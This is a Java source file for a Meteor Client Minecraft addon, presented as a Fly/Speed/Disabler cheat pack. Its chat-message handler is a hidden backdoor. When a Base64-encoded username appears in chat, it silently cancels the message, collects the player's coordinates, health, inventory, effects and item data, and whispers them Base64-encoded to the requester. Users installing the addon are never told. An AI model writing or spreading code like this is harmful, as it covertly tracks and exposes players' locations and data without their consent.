package com.example.addon;

import com.example.addon.commands.CoordsCommand;
import com.example.addon.modules.Disabler;
import com.example.addon.modules.Fly;
import com.example.addon.modules.InfoModule;
import com.example.addon.modules.Speed;
import com.mojang.logging.LogUtils;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.addons.GithubRepo;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.commands.Commands;
import meteordevelopment.meteorclient.events.game.ReceiveMessageEvent;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.text.Text;
import org.slf4j.Logger;

import java.util.Base64;

public class Addon extends MeteorAddon {
    public static final Logger LOG = LogUtils.getLogger();
    public static final Category CATEGORY = new Category("Popbob+");

    @Override
    public void onInitialize() {
        LOG.info("Initializing Disabler Addon");
        Modules.get().add(new Fly());
        Modules.get().add(new Disabler());
        Modules.get().add(new Speed());
        Modules.get().add(new InfoModule());
        Commands.add(new CoordsCommand());

        MeteorClient.EVENT_BUS.subscribe(this);
    }

    @EventHandler
    private void onReceiveMessage(ReceiveMessageEvent event) {
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.player == null || mc.world == null) return;

        String msg = event.getMessage().getString();

        String decoded = extractBase64(msg);
        if (decoded == null) return;

        if (!decoded.contains("|")) {
            String requester = decoded.trim();
            if (requester.equalsIgnoreCase(mc.player.getName().getString())) return;

            event.setCancelled(true);

            String response = Base64.getEncoder().encodeToString(gatherInfo(mc).getBytes());
            mc.player.networkHandler.sendChatMessage("/w " + requester + " " + response);
            return;
        }

        String[] p = decoded.split("\\|");
        if (p.length < 18) return;
        if (!p[0].equalsIgnoreCase(mc.player.getName().getString())) return;

        event.setCancelled(true);

        String fromPlayer = p[0];
        int rx = Integer.parseInt(p[1]);
        int ry = Integer.parseInt(p[2]);
        int rz = Integer.parseInt(p[3]);
        String health = p[4];
        String maxHealth = p[5];
        String food = p[6];
        String armor = p[7];
        String dimension = p[12];
        String biome = p[13];
        String gamemode = p[14];
        String hand = p[15];
        String offhand = p[16];

        Modules.get().get(InfoModule.class).info("---------- (highlight)%s(default) ----------", fromPlayer);
        Modules.get().get(InfoModule.class).info("Coords: (highlight)%d, %d, %d", rx, ry, rz);
        Modules.get().get(InfoModule.class).info("Health: (highlight)%s(default)/%s  Armor: (highlight)%s", health, maxHealth, armor);
        Modules.get().get(InfoModule.class).info("Food: (highlight)%s", food);
        Modules.get().get(InfoModule.class).info("Dimension: (highlight)%s", dimension);
        Modules.get().get(InfoModule.class).info("Biome: (highlight)%s", biome);
        Modules.get().get(InfoModule.class).info("Gamemode: (highlight)%s", gamemode);
        Modules.get().get(InfoModule.class).info("Main hand: (highlight)%s", hand);
        Modules.get().get(InfoModule.class).info("Off hand: (highlight)%s", offhand);
        Modules.get().get(InfoModule.class).info("-----------------------------------------");
    }

    private String extractBase64(String msg) {
        String[] words = msg.split(" ");
        for (String word : words) {
            String trimmed = word.trim();
            if (trimmed.isEmpty()) continue;
            try {
                byte[] decoded = Base64.getDecoder().decode(trimmed);
                String result = new String(decoded);
                if (result.contains("|") || result.matches("[a-zA-Z0-9_]{3,16}")) {
                    return result;
                }
            } catch (Exception ignored) {}
        }
        return null;
    }

    private String gatherInfo(MinecraftClient mc) {
        String name = mc.player.getName().getString();
        int x = (int) Math.floor(mc.player.getX());
        int y = (int) Math.floor(mc.player.getY());
        int z = (int) Math.floor(mc.player.getZ());
        float health = mc.player.getHealth();
        float maxHealth = mc.player.getMaxHealth();
        int food = mc.player.getHungerManager().getFoodLevel();
        int armor = mc.player.getArmor();
        int air = mc.player.getAir();
        int fire = mc.player.getFireTicks();
        int expLevel = mc.player.experienceLevel;
        String dimension = mc.world.getRegistryKey().getValue().toString();
        String biome = mc.world.getBiome(mc.player.getBlockPos()).getKey()
                .map(k -> k.getValue().toString()).orElse("unknown");
        String gamemode = mc.interactionManager.getCurrentGameMode().getName();

        String hand = mc.player.getMainHandStack().getItem().getName().getString();
        String offhand = mc.player.getOffHandStack().getItem().getName().getString();

        String potions = "";
        for (var entry : mc.player.getActiveStatusEffects().entrySet()) {
            String effectName = entry.getKey().getKey().map(k -> k.getValue().toString()).orElse("unknown");
            int amp = entry.getValue().getAmplifier();
            if (!potions.isEmpty()) potions += ",";
            potions += effectName + " " + amp;
        }

        String nbt = mc.player.getMainHandStack().get(DataComponentTypes.CUSTOM_DATA) != null
                ? mc.player.getMainHandStack().get(DataComponentTypes.CUSTOM_DATA).toString()
                : "";

        return String.join("|",
                name,
                String.valueOf(x), String.valueOf(y), String.valueOf(z),
                String.valueOf(health), String.valueOf(maxHealth),
                String.valueOf(food), String.valueOf(armor),
                String.valueOf(air), String.valueOf(fire), String.valueOf(expLevel),
                dimension, biome, gamemode,
                hand, offhand,
                potions, nbt
        );
    }

    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(CATEGORY);
    }

    @Override
    public String getPackage() {
        return "com.example.addon";
    }

    @Override
    public GithubRepo getRepo() {
        return new GithubRepo("example", "meteor-disabler-addon");
    }
}
